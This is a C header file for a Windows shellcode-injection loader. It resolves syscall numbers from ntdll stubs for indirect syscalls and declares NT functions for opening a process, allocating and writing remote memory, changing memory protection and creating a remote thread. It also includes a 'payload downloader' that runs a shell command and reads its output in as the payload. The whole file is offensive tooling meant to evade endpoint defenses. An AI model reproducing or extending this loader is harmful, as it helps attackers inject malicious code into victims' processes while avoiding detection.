#pragma once
#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>

#pragma region MACROS

boolean verbose = 1;

#define OKAY(MSG, ...) (verbose==1) ? printf("[+] " MSG "\n", __VA_ARGS__) : NULL
#define WARN(MSG, ...) (verbose==1) ? printf("[-] " MSG "\n", __VA_ARGS__) : NULL
#define STATUS_SUCCESS (NTSTATUS) 0x00000000L
typedef unsigned long long QWORD;
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#pragma endregion

//------------------------[SSNs]---------------------------//

#pragma region INJECTION GLOBALS
DWORD NtOpenProcessSSN;
DWORD NtVirtualAllocSSN;
DWORD NtWriteMemSSN;
DWORD NtCreateThreadSSN;
DWORD NtWaitForSSN;
DWORD NtCloseSSN;
DWORD NtProtectVirtualMemorySSN;

QWORD NtSyscallAddr;
#pragma endregion

//---------------------[STRUCTS]---------------------------//

#pragma region NT STRUCTURES
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
    );

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

#pragma endregion

//--------------------[PROTOTYPES]-------------------------//

#pragma region NT PROTOTYPES
extern NTSTATUS NtOpenProcess(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId
);

extern NTSTATUS NtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

extern NTSTATUS NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

extern NTSTATUS NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout
);

extern NTSTATUS NtClose(
    _In_ _Post_ptr_invalid_ HANDLE Handle
);

extern NTSTATUS NtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect
);


#pragma endregion

#pragma region HELPER METHODS

//---------------------------[GET SSNs]----------------------//

VOID GetSSN(HMODULE handle, LPCSTR name, PDWORD var) {
    UINT_PTR FuncAddr = (UINT_PTR)GetProcAddress(handle, name);
    *var = ((PBYTE)(FuncAddr + 0x4))[0];
    OKAY("[0x%p] [0x%0.3lx] -> %s()", (PVOID)FuncAddr, *var, name);
    return;
}

//------------------------[GET SYSCALL ADRR]-----------------//

VOID GetSyscallAddr(HMODULE handle, PUINT64 var) {
    UINT_PTR FuncAddr = (UINT_PTR)GetProcAddress(handle, "NtClose");
    *var = FuncAddr + 0x12;
    OKAY("syscall address -> 0x%p", (PVOID)*var);
    return;
}

//--------------------[PAYLOAD DOWNLOADER]------------------//

BOOL DownloadPayload(CHAR* command, const int size, UCHAR* var) {
    FILE* fpipe;
    char c = 0;
    UCHAR* out = (UCHAR*)malloc(size);

    if (0 == (fpipe = (FILE*)_popen(command, "r"))) {
        WARN("popen() failed");
        return FALSE;
    }

    int i = 0;
    while (fread(&c, sizeof(c), 1, fpipe)) {
        out[i] = c;
        i++;
    }

    _pclose(fpipe);

    memcpy(var, out, size);

    free(out);

    return TRUE;
}
#pragma endregion